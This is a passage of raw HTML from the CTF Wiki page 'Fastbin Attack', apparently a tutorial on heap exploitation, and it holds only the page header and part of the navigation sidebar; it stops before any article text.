<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="CTF Wiki"><meta name=author content="CTF Wiki Team"><link href=https://ctf-wiki.org/en/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/ rel=canonical><link rel=alternate href=/ hreflang=en><link rel=alternate href=/en/ hreflang=en><link rel=alternate href=/zh-tw/ hreflang=en><link rel="shortcut icon" href=../../../../../../assets/images/favicon.png><meta name=generator content="mkdocs-1.6.1, mkdocs-material-6.2.8+insiders-1.17.0"><title>Fastbin Attack - CTF Wiki</title><link rel=stylesheet href=../../../../../../assets/stylesheets/main.10cb3b3f.min.css><link rel=stylesheet href=../../../../../../assets/stylesheets/palette.697e47cb.min.css><meta name=theme-color content=#ffffff><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback"><style>:root{--md-text-font-family:"Noto Sans",;--md-code-font-family:"Source Code Pro",}</style><link rel=stylesheet href=https://ctf-wiki.org/static/css/extra.css></head> <body dir=ltr data-md-color-scheme=preference data-md-color-primary=white data-md-color-accent=red> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#fastbin-attack class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class="md-header md-header--lifted" data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=https://ctf-wiki.org/en/ title="CTF Wiki" class="md-header__button md-logo" aria-label="CTF Wiki"> <img src=https://ctf-wiki.org/static/img/logo.png alt=logo> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> CTF Wiki </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Fastbin Attack </span> </div> </div> </div> <div class=md-header__options> <div class=md-select> <span class="md-header__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12.87 15.07l-2.54-2.51.03-.03A17.52 17.52 0 0014.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04M18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12m-2.62 7l1.62-4.33L19.12 17h-3.24z"/></svg> </span> <div class=md-select__inner> <ul class=md-select__list> <li class=md-select__item> <a href=/ class=md-select__link> zh - 汉语 </a> </li> <li class=md-select__item> <a href=/en/ class=md-select__link> en - English </a> </li> <li class=md-select__item> <a href=/zh-tw/ class=md-select__link> zh-tw - 繁體中文 </a> </li> </ul> </div> </div> </div> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query data-md-state=active required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 00-3 3 3 3 0 003 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0018 16.08z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear data-md-component=search-reset tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/ctf-wiki/ctf-wiki title="Go to repository" class=md-source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> ctf-wiki/ctf-wiki </div> </a> </div> </nav> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../../../../../.. class=md-tabs__link> Start </a> </li> <li class=md-tabs__item> <a href=../../../../../../introduction/history/ class=md-tabs__link> Introduction </a> </li> <li class=md-tabs__item> <a href=../../../../../../misc/introduction/ class=md-tabs__link> Misc </a> </li> <li class=md-tabs__item> <a href=../../../../../../crypto/introduction/ class=md-tabs__link> Crypto </a> </li> <li class=md-tabs__item> <a href=../../../../../../web/introduction/ class=md-tabs__link> Web </a> </li> <li class=md-tabs__item> <a href=../../../../../../assembly/x86-x64/readme/ class=md-tabs__link> Assembly </a> </li> <li class=md-tabs__item> <a href=../../../../../../executable/elf/structure/basic-info/ class=md-tabs__link> Executable </a> </li> <li class=md-tabs__item> <a href=../../../../../../reverse/introduction/ class=md-tabs__link> Reverse </a> </li> <li class=md-tabs__item> <a href=../../../environment/ class="md-tabs__link md-tabs__link--active"> Pwn </a> </li> <li class=md-tabs__item> <a href=../../../../../../android/basic_develop/basic_develop/ class=md-tabs__link> Android </a> </li> <li class=md-tabs__item> <a href=../../../../../../ics/ctfs/ class=md-tabs__link> ICS </a> </li> <li class=md-tabs__item> <a href=../../../../../../blockchain/introduction/ class=md-tabs__link> Blockchain </a> </li> </ul> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=https://ctf-wiki.org/en/ title="CTF Wiki" class="md-nav__button md-logo" aria-label="CTF Wiki"> <img src=https://ctf-wiki.org/static/img/logo.png alt=logo> </a> CTF Wiki </label> <div class=md-nav__source> <a href=https://github.com/ctf-wiki/ctf-wiki title="Go to repository" class=md-source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> ctf-wiki/ctf-wiki </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-1 type=checkbox id=nav-1> <label class=md-nav__link for=nav-1> Start <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Start data-md-level=1> <label class=md-nav__title for=nav-1> <span class="md-nav__icon md-icon"></span> Start </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../.. class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../../../usage/ class=md-nav__link> How to use CTF Wiki </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-1-3 type=checkbox id=nav-1-3> <label class=md-nav__link for=nav-1-3> Contributing Guide <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Contributing Guide" data-md-level=2> <label class=md-nav__title for=nav-1-3> <span class="md-nav__icon md-icon"></span> Contributing Guide </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../contribute/before-contributing/ class=md-nav__link> Before Contributing </a> </li> <li class=md-nav__item> <a href=../../../../../../contribute/basic-contribute-approach/ class=md-nav__link> Basic Contribute Approach </a> </li> <li class=md-nav__item> <a href=../../../../../../contribute/documentation-requirement/ class=md-nav__link> Document Requirements </a> </li> <li class=md-nav__item> <a href=../../../../../../contribute/translation/ class=md-nav__link> Translation </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../discussion/ class=md-nav__link> Discussion </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-2 type=checkbox id=nav-2> <label class=md-nav__link for=nav-2> Introduction <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Introduction data-md-level=1> <label class=md-nav__title for=nav-2> <span class="md-nav__icon md-icon"></span> Introduction </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../introduction/history/ class=md-nav__link> History of CTF Wiki </a> </li> <li class=md-nav__item> <a href=../../../../../../introduction/mode/ class=md-nav__link> CTF Competition Types </a> </li> <li class=md-nav__item> <a href=../../../../../../introduction/content/ class=md-nav__link> CTF 竞赛内容 </a> </li> <li class=md-nav__item> <a href=../../../../../../introduction/experience/ class=md-nav__link> 线下攻防经验小结 </a> </li> <li class=md-nav__item> <a href=../../../../../../introduction/cgc/ class=md-nav__link> CGC 超级挑战赛 </a> </li> <li class=md-nav__item> <a href=../../../../../../introduction/resources/ class=md-nav__link> 学习资源 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3 type=checkbox id=nav-3> <label class=md-nav__link for=nav-3> Misc <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Misc data-md-level=1> <label class=md-nav__title for=nav-3> <span class="md-nav__icon md-icon"></span> Misc </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc/introduction/ class=md-nav__link> 杂项简介 </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/recon/ class=md-nav__link> 信息搜集技术 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-3 type=checkbox id=nav-3-3> <label class=md-nav__link for=nav-3-3> 编码分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=编码分析 data-md-level=2> <label class=md-nav__title for=nav-3-3> <span class="md-nav__icon md-icon"></span> 编码分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc/encode/communication/ class=md-nav__link> 通信领域常用编码 </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/encode/computer/ class=md-nav__link> 计算机相关的编码 </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/encode/modern/ class=md-nav__link> 现实世界中常用的编码 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../misc/prefix/ class=md-nav__link> 取证隐写前置技术 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-5 type=checkbox id=nav-3-5> <label class=md-nav__link for=nav-3-5> 图片分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=图片分析 data-md-level=2> <label class=md-nav__title for=nav-3-5> <span class="md-nav__icon md-icon"></span> 图片分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc/picture/introduction/ class=md-nav__link> 图片分析简介 </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/picture/png/ class=md-nav__link> PNG </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/picture/jpg/ class=md-nav__link> JPG </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/picture/gif/ class=md-nav__link> GIF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-6 type=checkbox id=nav-3-6> <label class=md-nav__link for=nav-3-6> 音频隐写 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=音频隐写 data-md-level=2> <label class=md-nav__title for=nav-3-6> <span class="md-nav__icon md-icon"></span> 音频隐写 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc/audio/introduction/ class=md-nav__link> 音频隐写 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-7 type=checkbox id=nav-3-7> <label class=md-nav__link for=nav-3-7> 流量包分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=流量包分析 data-md-level=2> <label class=md-nav__title for=nav-3-7> <span class="md-nav__icon md-icon"></span> 流量包分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc/traffic/introduction/ class=md-nav__link> 流量包分析简介 </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/traffic/fix/ class=md-nav__link> PCAP 文件修复 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-7-3 type=checkbox id=nav-3-7-3> <label class=md-nav__link for=nav-3-7-3> 协议分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=协议分析 data-md-level=3> <label class=md-nav__title for=nav-3-7-3> <span class="md-nav__icon md-icon"></span> 协议分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc/traffic/protocols/readme/ class=md-nav__link> 协议分析概述 </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/traffic/protocols/wireshark/ class=md-nav__link> Wireshark </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/traffic/protocols/http/ class=md-nav__link> HTTP </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/traffic/protocols/https/ class=md-nav__link> HTTPS </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/traffic/protocols/ftp/ class=md-nav__link> FTP </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/traffic/protocols/dns/ class=md-nav__link> DNS </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/traffic/protocols/wifi/ class=md-nav__link> WIFI </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/traffic/protocols/usb/ class=md-nav__link> USB </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../misc/traffic/data/ class=md-nav__link> 数据提取 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-8 type=checkbox id=nav-3-8> <label class=md-nav__link for=nav-3-8> 压缩包分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=压缩包分析 data-md-level=2> <label class=md-nav__title for=nav-3-8> <span class="md-nav__icon md-icon"></span> 压缩包分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc/archive/zip/ class=md-nav__link> ZIP 格式 </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/archive/rar/ class=md-nav__link> RAR 格式 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-9 type=checkbox id=nav-3-9> <label class=md-nav__link for=nav-3-9> 磁盘内存分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=磁盘内存分析 data-md-level=2> <label class=md-nav__title for=nav-3-9> <span class="md-nav__icon md-icon"></span> 磁盘内存分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc/disk-memory/introduction/ class=md-nav__link> 磁盘内存分析 </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/disk-memory/problem/ class=md-nav__link> 题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-10 type=checkbox id=nav-3-10> <label class=md-nav__link for=nav-3-10> Other <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Other data-md-level=2> <label class=md-nav__title for=nav-3-10> <span class="md-nav__icon md-icon"></span> Other </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc/other/pyc/ class=md-nav__link> pyc文件 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4 type=checkbox id=nav-4> <label class=md-nav__link for=nav-4> Crypto <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Crypto data-md-level=1> <label class=md-nav__title for=nav-4> <span class="md-nav__icon md-icon"></span> Crypto </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/introduction/ class=md-nav__link> 密码学简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-2 type=checkbox id=nav-4-2> <label class=md-nav__link for=nav-4-2> 基础数学知识 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=基础数学知识 data-md-level=2> <label class=md-nav__title for=nav-4-2> <span class="md-nav__icon md-icon"></span> 基础数学知识 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/basic/introduction/ class=md-nav__link> 基础数学知识 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-3 type=checkbox id=nav-4-3> <label class=md-nav__link for=nav-4-3> 古典密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=古典密码 data-md-level=2> <label class=md-nav__title for=nav-4-3> <span class="md-nav__icon md-icon"></span> 古典密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/classical/introduction/ class=md-nav__link> 古典密码简介 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/classical/monoalphabetic/ class=md-nav__link> 单表代换加密 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/classical/polyalphabetic/ class=md-nav__link> 多表代换加密 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/classical/others/ class=md-nav__link> 其它类型加密 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/classical/summary/ class=md-nav__link> 总结 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4 type=checkbox id=nav-4-4> <label class=md-nav__link for=nav-4-4> 流密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=流密码 data-md-level=2> <label class=md-nav__title for=nav-4-4> <span class="md-nav__icon md-icon"></span> 流密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/intro/ class=md-nav__link> 流密码 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4-2 type=checkbox id=nav-4-4-2> <label class=md-nav__link for=nav-4-4-2> 伪随机数生成器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=伪随机数生成器 data-md-level=3> <label class=md-nav__title for=nav-4-4-2> <span class="md-nav__icon md-icon"></span> 伪随机数生成器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/prng/intro/ class=md-nav__link> 伪随机数生成器介绍 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/prng/csprng/ class=md-nav__link> 密码安全伪随机数生成器 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/prng/problem/ class=md-nav__link> 题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4-3 type=checkbox id=nav-4-4-3> <label class=md-nav__link for=nav-4-4-3> 线性同余生成器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=线性同余生成器 data-md-level=3> <label class=md-nav__title for=nav-4-4-3> <span class="md-nav__icon md-icon"></span> 线性同余生成器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/lcg/intro/ class=md-nav__link> 线性同余生成器 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/lcg/challenge/ class=md-nav__link> 题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4-4 type=checkbox id=nav-4-4-4> <label class=md-nav__link for=nav-4-4-4> 反馈移位寄存器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=反馈移位寄存器 data-md-level=3> <label class=md-nav__title for=nav-4-4-4> <span class="md-nav__icon md-icon"></span> 反馈移位寄存器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/fsr/intro/ class=md-nav__link> 反馈移位寄存器 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/fsr/lfsr/ class=md-nav__link> 线性反馈移位寄存器 - LFSR </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/fsr/nfsr/ class=md-nav__link> 非线性反馈移位寄存器 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4-5 type=checkbox id=nav-4-4-5> <label class=md-nav__link for=nav-4-4-5> 特殊流密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=特殊流密码 data-md-level=3> <label class=md-nav__title for=nav-4-4-5> <span class="md-nav__icon md-icon"></span> 特殊流密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/special/rc4/ class=md-nav__link> RC4 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5 type=checkbox id=nav-4-5> <label class=md-nav__link for=nav-4-5> 块加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=块加密 data-md-level=2> <label class=md-nav__title for=nav-4-5> <span class="md-nav__icon md-icon"></span> 块加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/introduction/ class=md-nav__link> 块加密 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-2 type=checkbox id=nav-4-5-2> <label class=md-nav__link for=nav-4-5-2> ARX <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ARX data-md-level=3> <label class=md-nav__title for=nav-4-5-2> <span class="md-nav__icon md-icon"></span> ARX </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/arx-operations/ class=md-nav__link> ARX: Add-Rotate-Xor </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-3 type=checkbox id=nav-4-5-3> <label class=md-nav__link for=nav-4-5-3> DES <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=DES data-md-level=3> <label class=md-nav__title for=nav-4-5-3> <span class="md-nav__icon md-icon"></span> DES </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/des/ class=md-nav__link> DES </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-4 type=checkbox id=nav-4-5-4> <label class=md-nav__link for=nav-4-5-4> IDEA <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=IDEA data-md-level=3> <label class=md-nav__title for=nav-4-5-4> <span class="md-nav__icon md-icon"></span> IDEA </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/idea/ class=md-nav__link> IDEA </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-5 type=checkbox id=nav-4-5-5> <label class=md-nav__link for=nav-4-5-5> AES <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=AES data-md-level=3> <label class=md-nav__title for=nav-4-5-5> <span class="md-nav__icon md-icon"></span> AES </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/aes/ class=md-nav__link> AES </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-6 type=checkbox id=nav-4-5-6> <label class=md-nav__link for=nav-4-5-6> Simon and Speck <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Simon and Speck" data-md-level=3> <label class=md-nav__title for=nav-4-5-6> <span class="md-nav__icon md-icon"></span> Simon and Speck </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/simon-speck/ class=md-nav__link> Simon and Speck Block Ciphers </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-7 type=checkbox id=nav-4-5-7> <label class=md-nav__link 